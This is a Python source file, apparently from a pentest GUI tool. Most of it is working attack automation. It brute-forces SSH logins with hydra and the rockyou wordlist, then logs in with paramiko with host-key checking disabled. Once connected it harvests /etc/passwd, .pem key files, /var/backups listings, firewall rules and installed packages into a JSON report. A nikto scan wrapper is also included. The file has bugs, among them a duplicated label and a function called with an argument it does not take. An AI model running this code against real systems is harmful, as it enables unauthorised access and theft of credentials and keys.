import customtkinter as ctk
import subprocess
import re
import paramiko
import json
import os

from icon import set_icon

def exploit_window(simpleMode_window):

    def list_exploit():
        simpleMode_window.withdraw()
        exploit_page = ctk.CTk()
        exploit_page.title("Exploit")
        exploit_page.configure(bg='#053225')
        set_icon(exploit_page)

        screen_width = exploit_page.winfo_screenwidth()
        screen_height = exploit_page.winfo_screenheight()
        popup_width = 450
        popup_height = 500 
        x = (screen_width - popup_width) // 2
        y = (screen_height - popup_height) // 2
        exploit_page.geometry(f"{popup_width}x{popup_height}+{x}+{y}")

        # Création d'un label avec ttk
        label = ctk.CTkLabel(exploit_page, text="Configure the target and the port : ")
        label.grid(row=0, column=1, padx=10, pady=10)

        label_target = ctk.CTkLabel(exploit_page, text="The target : ")
        label_target.grid(row=1, column=0, padx=10, pady=10)
        entry_target = ctk.CTkEntry(exploit_page)
        entry_target.grid(row=1, column=1, padx=10, pady=10)

        label_port = ctk.CTkLabel(exploit_page, text="The target : ")
        label_port.grid(row=2, column=0, padx=10, pady=10)
        entry_port = ctk.CTkEntry(exploit_page)
        entry_port.grid(row=2, column=1, padx=10, pady=10)

        label_info = ctk.CTkLabel(exploit_page, text="Keep empty if none known : ")
        label_info.grid(row=3, column=1, padx=10, pady=10)

        label_username = ctk.CTkLabel(exploit_page, text="The Username : ")
        label_username.grid(row=4, column=0, padx=10, pady=10)
        entry_username = ctk.CTkEntry(exploit_page)
        entry_username.grid(row=4, column=1, padx=10, pady=10)

        label_pwd = ctk.CTkLabel(exploit_page, text="The Password : ")
        label_pwd.grid(row=5, column=0, padx=10, pady=10)
        entry_pwd = ctk.CTkEntry(exploit_page)
        entry_pwd.grid(row=5, column=1, padx=10, pady=10)

        button_session = ctk.CTkButton(exploit_page, text="Launch Exploit", width=22, command=lambda: launch_exploit(entry_target.get(), entry_port.get(), entry_username.get(), entry_pwd.get()))
        button_session.place(relx=0.5, rely=0.8, anchor='center')
        
        # Configurer la fonction à appeler lors de la fermeture de la fenêtre
        exploit_page.protocol("WM_DELETE_WINDOW", lambda: close_window(exploit_page))

    def close_window(window):
        # Détruire la fenêtre actuelle (la nouvelle fenêtre)
        window.destroy()
        # Rappeler la fenêtre principale
        simpleMode_window.deiconify()

    list_exploit()

def launch_exploit(target, port, username, password):
    print("exploit launch")
    print("Target:", target)
    print("Port:", port)
    print("Username:", username)
    print("Password:", password)

    if port == "22":
        if username and password:
            print("launch with username and password")
            setup_ssh_exploit(target, username, password)
        elif username:
            print("username only")
            setup_ssh_exploit(target, username)
        elif password:
            print("password only")
            setup_ssh_exploit(target, password)
        else:
            print("just port 80")
            setup_ssh_exploit(target)
    elif port == "80":
        print("bruteforce web : ")
        exploit_bruteforce_web(target)
    elif port == "21":
        print("exploit ftp / sftp")


def setup_ssh_exploit(target, username=None, password=None):
    print("Exploit launched")
    username_file = "lists/credentials/rockyou.txt"
    password_file = "lists/credentials/rockyou.txt"

    # Si seul un nom d'utilisateur est fourni
    if username and not password:
        print("Bruteforcing SSH with username:", username)
        if password_file:
            command = ["hydra", "-l", username, "-P", password_file, "ssh://" + target, "-t", "4", "-e", "ns"]
            print(command)
            result = subprocess.run(command, capture_output=True, text=True)
            print(result)
            find_credential(target, result)

    # Si seul un mot de passe est fourni
    if password and not username:
        print("Bruteforcing SSH with password:", password)
        if username_file:
            command = ["hydra", "-L", username_file, "-p", password, "ssh://" + target, "-t", "4", "-e", "ns"]
            print(command)
            result = subprocess.run(command, capture_output=True, text=True)
            print(result)
            find_credential(target, result)


    # Si à la fois un nom d'utilisateur et un mot de passe sont fournis
    if username and password:
        print("Bruteforcing SSH with username:", username, "and password:", password)
        command = ["hydra", "-l", username, "-p", password, "ssh://" + target, "-t", "4", "-e", "ns"]
        result = subprocess.run(command, capture_output=True, text=True)
        print(result)
        find_credential(target, result)

    # Si aucun nom d'utilisateur ni de mot de passe n'est fourni
    if not username and not password:
        print("Bruteforcing SSH with usernames from:", username_file, "and passwords from:", password_file)
        command = ["hydra", "-L", username_file, "-P", password_file, "ssh://" + target, "-t", "4", "-e", "ns"]
        print(command)
        result = subprocess.run(command, capture_output=True, text=True)
        print(result)
        find_credential(target, result)

def find_credential(target, result):
    
    result_parse = result.stdout
    login_match = re.search(r"login: (\w+)", result_parse)
    password_match = re.search(r"password: (\w+)", result_parse)

    if login_match and password_match:
        login_result = login_match.group(1)  # Obtenez le premier groupe correspondant (le login)
        password_result = password_match.group(1)  # Obtenez le premier groupe correspondant (le mot de passe)
        print("Login:", login_result)
        print("Password:", password_result)
        connexion_ssh_server(target, login_result, password_result)
    else:
        print("Login ou mot de passe non trouvé dans la sortie de la commande.")

def connexion_ssh_server(target, login_result, password_result):
    print("Connecting to SSH server...")
    # Créer un objet SSHClient
    ssh = paramiko.SSHClient()
    try:
        # Ignorer la vérification de l'empreinte du serveur SSH
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target, username=login_result, password=password_result)
        print("Successfully connected to SSH server.")
        firewall_rules, info_sys, user_group, file_permission, software_installed, sensitive_file = get_info_ssh_server(ssh)
        #ssh.close()

    except Exception as e:
        print("Error:", e)
        print("Failed to connect to SSH server.")


def get_info_ssh_server(ssh):
    ssh_info_sys, ssh_firewall_rules, sensitive_file_info, ssh_software_installed, ssh_file_permission, ssh_user_group = {}, {}, {}, {}, {}, {}
    try:
        # Informations système
        stdin, stdout, stderr = ssh.exec_command("uname -a")
        system_info = stdout.read().decode().strip()
        if system_info:
            ssh_info_sys['system_info'] = system_info

        # Utilisateurs et groupes
        stdin, stdout, stderr = ssh.exec_command("cat /etc/passwd")
        user_accounts_str = stdout.read().decode().strip()
        if user_accounts_str:
            users = []
            user_accounts_lines = user_accounts_str.split('\n')
            for line in user_accounts_lines:
                if line.strip():
                    columns = line.split(':')
                    user = {
                        'name': columns[0],
                        'password': columns[1],
                        'uid': columns[2],
                        'gid': columns[3],
                        'comment': columns[4],
                        'home': columns[5],
                        'shell': columns[6]
                    }
                    users.append(user)
            ssh_user_group['user_accounts'] = users

        # Permissions des fichiers
        stdin, stdout, stderr = ssh.exec_command("ls -l /")
        file_permissions = stdout.read().decode().strip()
        if file_permissions:
            ssh_file_permission['file_permissions'] = file_permissions

        # Logiciels installés
        stdin, stdout, stderr = ssh.exec_command("dpkg -l")
        installed_software_str = stdout.read().decode().strip()
        if installed_software_str:
            ssh_software_installed['installed_software'] = parse_installed_software(installed_software_str)

        # Fichiers sensibles
        stdin, stdout, stderr = ssh.exec_command('find -type f -name "*.pem"')
        sensitive_files = stdout.read().decode().strip()
        stdin2, stdout2, stderr2 = ssh.exec_command('ls /var/backups')
        sensitive_files2 = stdout2.read().decode().strip()
        if sensitive_files and sensitive_files2:
            sensitive_files_list = sensitive_files.split('\n')
            sensitive_files_list2 = sensitive_files2.split('\n')
            sensitive_file_info['sensistive_file'] = sensitive_files_list, sensitive_files_list2

        # Mesures de sécurité
        stdin, stdout, stderr = ssh.exec_command("iptables -L")
        firewall_rules = stdout.read().decode().strip()
        if firewall_rules:
            ssh_firewall_rules['firewall_rules'] = firewall_rules

        # Détection de vulnérabilités
        # Utiliser des outils comme nmap, nikto, etc. selon les besoins
        session_file = "json/session.json"  # Chemin vers le fichier de session
        session_name = get_session_name(session_file)
        # Charger le fichier session.json
        with open(f"reports/{session_name}_session/{session_name}.json", 'r') as f:
            session_data = json.load(f)

        # Vérifier de la key et incrémenter la clé ssh_connexionX dans le fichier
        ssh_connexion_key = "ssh_connexion1"  # Par défaut
        if session_data:
            existing_keys = [key for key in session_data if key.startswith("ssh_connexion")]
            if existing_keys:
                max_connexion = max(int(key.split("ssh_connexion")[1]) for key in existing_keys)
                ssh_connexion_key = f"ssh_connexion{max_connexion + 1}"


        # Ajouter les données récupérées dans le JSON
        session_data[ssh_connexion_key] = {
            "ssh_info_sys": ssh_info_sys,
            "ssh_firewall_rules": ssh_firewall_rules,
            "ssh_sensitive_file": sensitive_file_info,
            "ssh_software_installed": ssh_software_installed,
            "ssh_file_permission": ssh_file_permission,
            "ssh_user_group": ssh_user_group
        }

        # Enregistrer la structure de données mise à jour
        with open(f"reports/{session_name}_session/{session_name}.json", 'w') as f:
            json.dump(session_data, f, indent=4)

    except Exception as e:
        print("Error:", e)
        print("Failed to retrieve information from SSH server.")

    return ssh_firewall_rules, ssh_info_sys, ssh_user_group, ssh_file_permission, ssh_software_installed, sensitive_file_info

#fonction permettant de récupérer le nom de la session
def get_session_name(session_file):
    session_name = ""
    if os.path.exists(session_file):
        with open(session_file, 'r') as file:
            data = json.load(file)
            session_name = data['sessionName']
            if session_name != "":
                print(f"Session existante trouvée : {session_name}")
            else:
                #appelle de la fonction pour la création de la premiere session
                print("session file doesn't exist")
    return session_name


def parse_installed_software(software_str):
    installed_software = []
    # Divise la chaîne en lignes individuelles
    software_lines = software_str.split('\n')

    # Parcourir chaque ligne
    for line in software_lines:
        # Ignorer les lignes vides ou les lignes d'en-tête
        if line and not line.startswith("||") and not line.startswith("++-"):
            # Séparer la ligne en colonnes (nom, version, description)
            columns = line.split()
            # Vérifier si la ligne est bien formatée
            if len(columns) >= 3:
                name = columns[1]
                version = columns[2]
                description = ' '.join(columns[3:])
                # Ajouter le logiciel à la liste
                installed_software.append({"name": name.strip(), "version": version.strip(), "description": description.strip()})

    return installed_software


def exploit_web_server(target):
    command = ["sudo", f"nikto -h {target}"]
    print(command)

    try:
        # Exécuter la commande Nikto
        result = subprocess.run(command, capture_output=True, text=True, check=True)

        # Afficher la sortie de la commande Nikto
        print("Nikto Scan Results:")
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        # En cas d'erreur lors de l'exécution de la commande
        print("Error running Nikto:", e)

def exploit_bruteforce_web():
    print("launch ssh bruteforce")